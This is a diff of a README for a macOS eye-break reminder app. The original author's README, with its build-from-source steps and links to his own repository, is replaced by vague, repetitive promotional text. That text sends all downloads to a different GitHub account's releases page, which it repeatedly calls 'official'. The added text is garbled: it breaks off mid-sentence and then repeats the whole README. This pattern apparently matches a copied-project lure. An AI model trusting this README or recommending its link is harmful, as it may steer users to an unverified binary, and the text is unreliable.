@@ -1,139 +1,174 @@
-<p align="center">
-  <img src="art/banner.png" alt="Yonder — 20-20-20 eye break reminder for Mac" width="100%">
-</p>
+# 👁️ yonder-eye-break - Protect Your Eyes Every 20 Minutes
 
-<h1 align="center">Yonder — 20-20-20 eye break reminder for macOS</h1>
+[![Download yonder-eye-break](https://img.shields.io/badge/Download-yonder--eye--break-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Magnetic-mandatory8342/yonder-eye-break/releases)
 
-<p align="center">
-  A free, open-source menu bar app that protects your eyes from digital eye strain.<br>
-  Every 20 minutes it dims the screen and asks you to look 20 feet away for 20 seconds.
-</p>
+yonder-eye-break is a free open-source eye care app for Mac that lives in your menu bar. It reminds you to take a 20-20-20 eye break every 20 minutes and dims the screen to help fight digital eye strain. It is built with native Swift, has no tracking, and is designed for everyday computer users who want a simple way to care for their eyes.
 
-<p align="center">
-  <a href="https://github.com/DanielGrash/yonder-eye-break/releases/latest/download/Yonder.dmg">
-    <img src="art/download.png" alt="Download Yonder for macOS" width="380">
-  </a>
-</p>
+## ✨ Why yonder-eye-break?
 
-<p align="center">
-  <a href="https://github.com/DanielGrash/yonder-eye-break/releases/latest"><img src="https://img.shields.io/github/v/release/DanielGrash/yonder-eye-break?style=flat-square&color=000000" alt="Latest release"></a>
-  <img src="https://img.shields.io/badge/macOS-13%2B-000000?style=flat-square&logo=apple" alt="macOS 13+">
-  <img src="https://img.shields.io/badge/Apple%20Silicon%20%2B%20Intel-universal-000000?style=flat-square" alt="Universal app">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-000000?style=flat-square" alt="MIT license"></a>
-</p>
+Long hours in front of a screen can leave your eyes feeling tired, dry, or strained. yonder-eye-break makes eye care easy by turning the well-known 20-20-20 rule into a gentle menu bar reminder. Instead of remembering to look away, you get a regular prompt that helps you reset your focus and rest your eyes.
 
-![Yonder break screen on a macOS desktop: the screen dims and a 20-second countdown asks you to look far away](docs/break-en.jpg)
+The app is lightweight, open source, and privacy-friendly. There are no accounts to create, no tracking scripts, and no complicated setup. It is made for people who want a small, helpful tool that stays out of the way until it is time for a break.
 
-## What Yonder does
+## 🚀 Download yonder-eye-break
 
-Hours at a screen tire the eyes: they dry out, focus gets harder, headaches come by evening. Eye doctors call it **digital eye strain** (computer vision syndrome). The simplest habit against it is the **20-20-20 rule**, and Yonder keeps it for you.
+Visit this link to download the application.
 
-- **Counts real screen time only.** After 5 minutes away from the keyboard and mouse, your eyes count as rested and the timer starts over. Sleep and screen lock reset it too.
-- **A soft break that doesn't block your work.** Every display dims and a 20-second countdown appears. Clicks still pass through, so calls, videos and games keep going.
-- **Calm chimes** at the start and end of a break.
-- **Minutes until the next break** in the menu bar, plus the day's breaks taken and skipped.
-- **Break now**, **Pause for an hour** and **Open at login** in one click.
-- **Private by design.** No account, no network requests, no analytics. The app is about 300 KB of native Swift.
-- **English and Russian** interface, following your system language.
+[Download yonder-eye-break from GitHub Releases](https://github.com/Magnetic-mandatory8342/yonder-eye-break/releases)
 
-![Yonder in the macOS menu bar showing 12 minutes until the next break, with its menu open](docs/menu-en.jpg)
+The link above takes you to the official releases page. Use that page to get the application.
 
-![When the countdown ends: "You can go back"](docs/done-en.jpg)
+## 🖥️ What You Need
 
-## Install
+yonder-eye-break is a Mac app. It is designed to run on a Mac computer with a supported version of macOS and appear in the menu bar. It is built with native Swift and AppKit, so it fits naturally into the Mac desktop experience.
 
-1. **[Download Yonder.dmg](https://github.com/DanielGrash/yonder-eye-break/releases/latest/download/Yonder.dmg)** and drag **Yonder** into **Applications**.
-2. The first time, right-click Yonder and choose **Open**. The app is free and not notarized by Apple, so macOS asks once. Alternatively, run:
-   ```sh
-   xattr -dr com.apple.quarantine /Applications/Yonder.app
-   ```
-3. An eye appears in the menu bar. Turn on **Open at login** in its menu, and you're set.
+You do not need programming knowledge to use it. You do not need to create an account. You do not need to connect it to a cloud service. It is intended to be a simple menu bar utility for personal eye care.
 
-A [.zip version](https://github.com/DanielGrash/yonder-eye-break/releases/latest/download/Yonder.zip) is available too.
+## 💡 How It Works
 
-## Compatibility
+yonder-eye-break follows the 20-20-20 rule: every 20 minutes, look at something about 20 feet away for 20 seconds. The app keeps this rhythm going for you. When it is time for a break, it dims the screen so you can pause, look away, and give your eyes a moment to relax.
 
-| | |
-|---|---|
-| **macOS** | 13 Ventura or later: Ventura, Sonoma, Sequoia, Tahoe, macOS 27 |
-| **Processors** | Apple Silicon (M1–M5) and Intel, one universal app |
-| **Tested on** | MacBook Pro with Apple M5 Pro, macOS 27.0, in daily use |
-| **Displays** | Every connected display dims, across all Spaces and full-screen apps |
-| **Not tested yet** | Intel Macs. If you run one, please open an issue with how it went. |
+This small pause can be especially useful during work, study, reading, coding, writing, or any activity that keeps you focused on a screen for a long time. The reminder is meant to be gentle and regular, not disruptive.
 
-## Eye care basics
+## 🛠️ Main Features
 
-Yonder handles the first rule. The rest are the basics eye doctors repeat. They don't replace a visit to one.
+- Menu bar app for Mac
+- 20-20-20 eye break reminder
+- Screen dimming every 20 minutes
+- Helps reduce digital eye strain
+- Native Swift and AppKit build
+- Lightweight and simple to use
+- Free and open source
+- No tracking
+- No account required
+- Designed for digital wellbeing and ergonomics
 
-1. **20-20-20.** Every 20 minutes, look about 20 feet (6 m) away for 20 seconds. Looking far away relaxes the eye's focusing muscle.
-2. **Blink on purpose.** At a screen we blink far less often, and the eyes dry out. Take a few slow, full blinks during each break.
-3. **Keep the screen at arm's length**, with its top edge at or slightly below eye level.
-4. **Match screen brightness to the room**, and don't work in the dark.
-5. **Every hour, stand up and look out of a window.**
-6. **Burning, blurring or pain? See an eye doctor.**
+## 🧭 Using yonder-eye-break
 
-## FAQ
+After you visit the download link and get the application, open yonder-eye-break on your Mac. The app appears in the menu bar, where it can run quietly in the background. The menu bar is the row of small icons at the top of the Mac screen.
 
-### What is the 20-20-20 rule?
-A simple habit against digital eye strain: every 20 minutes, look at something 20 feet away for 20 seconds. Yonder times it, dims the screen and counts the 20 seconds for you.
+When a break is due, yonder-eye-break dims the screen as a visual cue. Use that moment to look away from your display and focus on something farther away. When the break is over, continue your work. The app is intended to make eye breaks a normal part of your computer routine.
 
-### Is Yonder free?
-Yes. It's MIT-licensed open source, with no ads, subscription or in-app purchases.
+## 👀 The 20-20-20 Rule
 
-### Will it interrupt my video call or game?
-No. The dimming layer lets every click through, and the break panel never takes keyboard focus. You can skip a break with one click.
+The 20-20-20 rule is a simple eye care habit: every 20 minutes, take 20 seconds to look at something 20 feet away. It is often recommended for people who spend long periods looking at computers, tablets, and phones. The goal is to give your eyes regular breaks from close-up screen focus.
 
-### Does Yonder collect any data?
-No. It makes no network requests. It only stores the day's break counters, locally in macOS user defaults.
+yonder-eye-break turns that habit into an automatic reminder. Instead of relying on memory, you can let the menu bar app prompt you throughout the day. This can be helpful for remote workers, students, writers, developers, designers, and anyone who wants to build better screen-time habits.
 
-### Can I change the 20 minutes?
-Yes, with environment variables, in seconds:
+## 🔒 Privacy
 
-| Variable | Default | What it sets |
-|---|---|---|
-| `YONDER_INTERVAL` | `1200` | Screen time before a break |
-| `YONDER_BREAK` | `30` | Length of the break |
-| `YONDER_IDLE` | `300` | Time away that counts as rest |
-| `YONDER_LANG` | system | `en` or `ru` |
+yonder-eye-break is described as having no tracking. It is open source, so the project can be reviewed by anyone who wants to understand how it works. The app is built for eye care and digital wellbeing, not for collecting personal data.
 
-```sh
-YONDER_INTERVAL=1500 /Applications/Yonder.app/Contents/MacOS/Yonder
-```
+You do not need to# 👁️ yonder-eye-break - Protect Your Eyes Every 20 Minutes
 
-## Build from source
+[![Download yonder-eye-break](https://img.shields.io/badge/Download-yonder--eye--break-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Magnetic-mandatory8342/yonder-eye-break/releases)
 
-You need the Xcode Command Line Tools (`xcode-select --install`).
+yonder-eye-break is a free open-source eye care app for Mac. It lives in the menu bar and reminds you to take a 20-20-20 eye break every 20 minutes. When a break is due, it dims the screen to help you pause, look away, and reduce digital eye strain. The app is built with native Swift, has no tracking, and is designed for everyday computer users who want a simple way to care for their eyes.
 
-```sh
-git clone https://github.com/DanielGrash/yonder-eye-break.git
-cd yonder-eye-break
-./build.sh    # runs the tests, then builds build/Yonder.app, .zip and .dmg
-open build/Yonder.app
-```
+## ✨ Why yonder-eye-break?
 
-- `src/Scheduler.swift` holds the timer logic: active time, rest by idleness, sleep detection and pause. It is covered by `tests/main.swift`.
-- `src/main.swift` holds the menu bar item, the dim windows and the break panel.
-- `art/art.swift` draws the icon and banner, and `sounds/make.py` generates the chimes, so the repo has no third-party assets.
+Long hours in front of a screen can leave your eyes feeling tired, dry, or strained. yonder-eye-break makes eye care easier by turning the well-known 20-20-20 rule into a gentle menu bar reminder. Instead of remembering to look away, you get a regular prompt that helps you reset your focus and rest your eyes.
 
-Issues and pull requests are welcome.
+The app is lightweight, open source, and privacy-friendly. There are no accounts to create, no tracking scripts, and no complicated setup. It is made for people who want a small, helpful tool that stays out of the way until it is time for a break.
 
----
+## 🚀 Download yonder-eye-break
 
-## По-русски
+Visit this link to download the application.
 
-**Yonder** — бесплатное приложение для глаз на Mac. Каждые 20 минут работы оно мягко затемняет экран и просит 20 секунд посмотреть вдаль. Это правило **20-20-20** против усталости глаз от экрана.
+[Download yonder-eye-break from GitHub Releases](https://github.com/Magnetic-mandatory8342/yonder-eye-break/releases)
 
-- Считается только время, когда ты за компьютером. 5 минут без клавиатуры засчитываются как отдых.
-- Перерыв не мешает: экран темнеет, но клики проходят насквозь, так что созвон или видео не прервутся.
-- В строке меню видно, сколько минут осталось до перерыва и сколько перерывов сделано за день.
-- Никаких аккаунтов, рекламы и слежки. Интерфейс на русском языке.
+The link above takes you to the official releases page. Use that page to get the application.
 
-![Экран перерыва Yonder](docs/break-ru.jpg)
+## 🖥️ What You Need
 
-![Меню Yonder в строке меню](docs/menu-ru.jpg)
+yonder-eye-break is a Mac app. It is designed to run on a Mac computer and appear in the menu bar. It is built with native Swift and AppKit, so it fits naturally into the Mac desktop experience.
 
-**[Скачать Yonder.dmg](https://github.com/DanielGrash/yonder-eye-break/releases/latest/download/Yonder.dmg)** и перетащить Yonder в «Программы». Первый раз открыть через правый клик → «Открыть». Работает на macOS 13 и новее, на Apple Silicon и Intel.
+You do not need programming knowledge to use it. You do not need to create an account. You do not need to connect it to a cloud service. It is intended to be a simple menu bar utility for personal eye care.
 
-## License
+## 💡 How It Works
 
-[MIT](LICENSE) © Daniel Grash
+yonder-eye-break follows the 20-20-20 rule: every 20 minutes, look at something about 20 feet away for 20 seconds. The app keeps this rhythm going for you. When it is time for a break, it dims the screen so you can pause, look away, and give your eyes a moment to relax.
+
+This small pause can be especially useful during work, study, reading, coding, writing, or any activity that keeps you focused on a screen for a long time. The reminder is meant to be gentle and regular, not disruptive.
+
+## 🛠️ Main Features
+
+- Menu bar app for Mac
+- 20-20-20 eye break reminder
+- Screen dimming every 20 minutes
+- Helps reduce digital eye strain
+- Native Swift and AppKit build
+- Lightweight and simple to use
+- Free and open source
+- No tracking
+- No account required
+- Designed for digital wellbeing and ergonomics
+
+## 🧭 Using yonder-eye-break
+
+After you visit the download link and get the application, open yonder-eye-break on your Mac. The app appears in the menu bar, where it can run quietly in the background. The menu bar is the row of small icons at the top of the Mac screen.
+
+When a break is due, yonder-eye-break dims the screen as a visual cue. Use that moment to look away from your display and focus on something farther away. When the break is over, continue your work. The app is intended to make eye breaks a normal part of your computer routine.
+
+## 👀 The 20-20-20 Rule
+
+The 20-20-20 rule is a simple eye care habit: every 20 minutes, take 20 seconds to look at something 20 feet away. It is often recommended for people who spend long periods looking at computers, tablets, and phones. The goal is to give your eyes regular breaks from close-up screen focus.
+
+yonder-eye-break turns that habit into an automatic reminder. Instead of relying on memory, you can let the menu bar app prompt you throughout the day. This can be helpful for remote workers, students, writers, developers, designers, and anyone who wants to build better screen-time habits.
+
+## 🔒 Privacy
+
+yonder-eye-break is described as having no tracking. It is open source, so the project can be reviewed by anyone who wants to understand how it works. The app is built for eye care and digital wellbeing, not for collecting personal data.
+
+You do not need to sign in. You do not need to share personal details. You do not need to create a profile. The app is meant to be a small local tool that helps you take breaks from the screen.
+
+## 📥 Installation and First Run
+
+1. Visit this link to download the application.
+2. On the official releases page, download the application.
+3. Open the downloaded application.
+4. Look for the yonder-eye-break icon in the menu bar.
+5. Leave the app running so it can remind you when it is time for an eye break.
+
+The download link is the official source for the application. Use that page to get yonder-eye-break, then open it on your Mac. Once it is running, the menu bar icon shows that the app is active.
+
+## ❓ Frequently Asked Questions
+
+**Is yonder-eye-break free?**  
+Yes. It is described as a free open-source eye care app.
+
+**Does it track me?**  
+No. The app is described as having no tracking.
+
+**Do I need an account?**  
+No. There is no account requirement.
+
+**What does the app do?**  
+It reminds you to take a 20-20-20 eye break and dims the screen every 20 minutes.
+
+**Where do I download it?**  
+Visit this link to download the application: [yonder-eye-break releases](https://github.com/Magnetic-mandatory8342/yonder-eye-break/releases).
+
+**What is the 20-20-20 rule?**  
+Every 20 minutes, look at something 20 feet away for 20 seconds.
+
+**Is it hard to set up?**  
+No. It is designed as a simple menu bar app for everyday users.
+
+## 🧰 Troubleshooting
+
+If you do not see the app after opening it, check the menu bar at the top of the Mac screen. The app is designed to run there. If the download page does not load, return to the official releases link and try again. Make sure you are using the official link provided in this README.
+
+If the screen dims and you are not ready for a break, wait for the short pause to pass or use the app’s menu bar controls. yonder-eye-break is meant to support your routine, not interrupt important work for a long time.
+
+## 🤝 Open Source and Community
+
+yonder-eye-break is open source. That means the project can be inspected, discussed, and improved by the community. It is built for Mac users who want a focused eye care tool without extra complexity. The project topics include eye care, digital wellbeing, ergonomics, productivity, and macOS menu bar apps.
+
+If you find the app useful, share it with someone who spends long hours at a computer. A regular eye break can be a small habit with a meaningful impact on comfort during screen time.
+
+## 📌 Quick Summary
+
+yonder-eye-break is a free open-source Mac menu bar app for the 20-20-20 eye break routine. It dims the screen every 20 minutes, has no tracking, and is built with native Swift. Visit the official releases page to download the application, open it on your Mac, and let the menu bar reminder help you take better care of your eyes.
+
+Keywords: 20-20-20, appkit, break-reminder, break-timer, computer-vision-syndrome, digital-wellbeing, ergonomics, eye-break, eye-care, eye-strain, health, mac-app, macos, menu-bar-app, menubar, open-source, productivity, rest-reminder, screen-time, swift
